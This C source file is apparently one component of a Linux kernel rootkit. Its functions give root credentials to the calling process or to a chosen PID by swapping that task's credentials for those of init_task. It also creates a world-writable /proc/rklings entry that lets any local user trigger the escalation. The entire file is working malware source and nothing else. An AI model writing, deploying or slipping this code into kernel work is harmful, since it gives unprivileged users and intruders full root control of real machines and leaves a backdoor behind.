// SPDX-License-Identifier: GPL-2.0
#include "rootkit.h"
#include <linux/cred.h>
#include <linux/kernel.h>
#include <linux/pid.h>
#include <linux/printk.h>
#include <linux/proc_fs.h>
#include <linux/rcupdate.h>
#include <linux/sched.h>
#include <linux/sched/task.h>
#include <linux/seq_file.h>

static int rk_escalate(void)
{
	struct cred *new_cred;

	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred)
		return -ENOMEM;
	return commit_creds(new_cred);
}

static int rk_escalate_pid(pid_t pid)
{
	struct task_struct *task;
	struct cred *new_cred;
	const struct cred *old_cred;

	rcu_read_lock();
	task = pid_task(find_vpid(pid), PIDTYPE_PID);
	if (!task) {
		rcu_read_unlock();
		return -ESRCH;
	}
	if (!task->mm) {
		rcu_read_unlock();
		return -EINVAL;
	}
	new_cred = prepare_kernel_cred(&init_task);
	if (!new_cred) {
		rcu_read_unlock();
		return -ENOMEM;
	}
	old_cred = (const struct cred *)task->real_cred;
	rcu_assign_pointer(task->real_cred, new_cred);
	rcu_assign_pointer(task->cred, new_cred);
	rcu_read_unlock();
	put_cred(old_cred);
	return 0;
}

/* Deferred PID escalation via /proc/rklings write */

static pid_t deferred_pid;
static struct proc_dir_entry *proc_entry;

static int cmd_escalate(const char *arg)
{
	pid_t pid;

	if (!arg)
		return rk_escalate();
	if (kstrtoint(arg, 10, &pid) != 0 || pid <= 0)
		return -EINVAL;
	deferred_pid = pid;
	return 0;
}

static int rk_proc_show(struct seq_file *m, void *v)
{
	if (deferred_pid)
		seq_printf(m, "pending: %d\n", deferred_pid);
	return 0;
}

static int rk_proc_open(struct inode *inode, struct file *file)
{
	return single_open(file, rk_proc_show, NULL);
}

static ssize_t rk_proc_write(struct file *file, const char __user *ubuf,
			     size_t count, loff_t *ppos)
{
	if (!deferred_pid)
		return count;
	if (rk_escalate_pid(deferred_pid) == 0)
		deferred_pid = 0;
	return count;
}

static const struct proc_ops rk_proc_ops = {
    .proc_open = rk_proc_open,
    .proc_read = seq_read,
    .proc_write = rk_proc_write,
    .proc_lseek = seq_lseek,
    .proc_release = single_release,
};

int rk_proc_init(void)
{
	proc_entry = proc_create("rklings", 0666, NULL, &rk_proc_ops);
	if (!proc_entry)
		return -ENOMEM;
	return 0;
}

void rk_proc_exit(void)
{
	proc_remove(proc_entry);
}

static const struct rk_cmd_entry escalate_cmds[] = {
	{ "e", cmd_escalate },
};

int rk_escalate_init(void)
{
	return rk_cmds_register(escalate_cmds, ARRAY_SIZE(escalate_cmds));
}
